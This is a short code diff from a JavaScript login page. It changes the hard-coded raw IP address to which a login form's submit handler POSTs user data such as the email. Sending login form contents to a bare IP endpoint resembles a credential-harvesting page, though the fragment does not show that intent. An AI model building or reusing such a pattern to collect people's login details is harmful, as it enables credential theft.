@@ -13,7 +13,7 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
         email: email
     };
 
-    fetch('https://172.226.160.2:3000/saveUserData', {
+    fetch('https://104.28.128.12:3000/saveUserData', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
